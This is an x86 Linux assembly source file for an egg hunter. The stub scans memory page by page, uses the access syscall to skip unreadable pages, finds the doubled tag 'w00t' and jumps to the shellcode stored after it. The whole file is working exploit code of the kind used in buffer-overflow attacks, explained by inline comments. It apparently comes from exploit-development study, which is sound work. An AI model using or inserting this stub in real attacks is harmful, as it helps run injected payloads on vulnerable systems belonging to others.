global _start

section       .text
_start:
	
	xor edx,edx    ;clear edx, just in case
next_page:
	or dx,0x0fff   ; get last address in page

next_address:
	inc edx        ; acts as a counter
                       ;(increments the value in EDX)
	lea ebx,[edx+0x4];load edx + 4 value into ebx which is the first instruction in a page
        push byte +0x21; push 0x21 for access syscall
        pop eax        ; pop 0x21 into eax
                       ; so it can be used as parameter
                       ; to syscall - see next
        int 0x80       ; tell the kernel i want a do a
                       ; syscall using previous register
        cmp al,0xf2    ; check if access violation occurs, EFAULT = -14 = 0xf2
        je next_page   ; this part of memory can't be read, jump to next page
	mov eax,0x77303074 ; this is the tag (egg) = w00t
	mov edi,edx    ; set edi to our pointer
	scasd          ; compare for status
        jnz next_address; (back to inc edx) check egg found or not
        scasd          ; when egg has been found
        jnz next_address; (jump back to "inc edx")
                       ; if only the first egg was found
        jmp edi        ; edi points to beginning of the shellcode
